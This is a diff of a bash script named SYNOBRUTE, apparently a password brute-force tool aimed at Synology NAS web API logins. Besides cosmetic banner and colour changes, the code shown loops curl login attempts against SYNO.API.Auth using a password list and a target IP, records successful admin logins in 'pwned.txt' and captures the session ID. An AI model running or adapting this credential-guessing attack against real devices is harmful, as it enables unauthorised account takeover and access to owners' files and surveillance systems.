@@ -1,14 +1,13 @@
 #!/bin/bash
-echo"███████╗██╗   ██╗███╗   ██╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
-██╔════╝╚██╗ ██╔╝████╗  ██║██╔═══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
-███████╗ ╚████╔╝ ██╔██╗ ██║██║   ██║██████╔╝██████╔╝██║   ██║   ██║   █████╗  
-╚════██║  ╚██╔╝  ██║╚██╗██║██║   ██║██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
-███████║   ██║   ██║ ╚████║╚██████╔╝██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
-╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
-                                                                              
-
-"
-echo "SYNOBRUTE - evolutio - 2018" 
+echo "███████╗██╗   ██╗███╗   ██╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗"
+echo "██╔════╝╚██╗ ██╔╝████╗  ██║██╔═══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝"
+echo "███████╗ ╚████╔╝ ██╔██╗ ██║██║   ██║██████╔╝██████╔╝██║   ██║   ██║   █████╗  "
+echo "╚════██║  ╚██╔╝  ██║╚██╗██║██║   ██║██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  "
+echo "███████║   ██║   ██║ ╚████║╚██████╔╝██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗"
+echo "╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝"
+echo" "
+echo "SYNOBRUTE - evolutio - 2018"
+ 
 date
 echo ""
 echo " ./bruteforce.sh password.txt 192.168.1.101"
@@ -28,20 +27,19 @@ curlResult=$(curl -s "http://${syno_url}:5000/webapi/query.cgi?api=SYNO.API.Info
 authPath=$(echo "$curlResult" | jq -r '.["data"]["SYNO.API.Auth"]["path"]')
 #  login
 curlResult=$(curl -s "http://${syno_url}:5000/webapi/${authPath}?api=SYNO.API.Auth&method=Login&version=${vAuth}&account=${syno_user}&passwd=${syno_pwd}&session=SurveillanceStation&format=sid")
-
-if [[ $(echo "$curlResult" | jq -r '.["success"]') == 'true' ]]; then
-                echo "-----------------------------------"                
-				echo "succes login for $syno_url"
-                echo "-----------------------------------"
+if [[ $(echo "$curlResult" | jq -r '.["success"]') == 'true' ]]; then 
+				echo -e "\033[32m ----------------------------------- \033[0m"				
+				echo -e "\033[32m succes login for $syno_url \033[0m"
+				echo -e "\033[32m ----------------------------------- \033[0m"				
 				echo ""
                 echo "login is admin $output" >> pwned.txt
                 exit 0
 fi
 if [[ $(echo "$curlResult" | jq -r '.["success"]') == 'false' ]]; then
-        echo "Error on login : bad password !!!"
+		echo -e "\033[31mError on login : bad password !!! \033[0m"
 		echo ""
 else
-        echo "Error on login"
+		echo -e "\033[31mError on login \033[0m"
 		echo ""
 fi
 SID=$(echo "$curlResult" | jq -r '.["data"]["sid"]')				
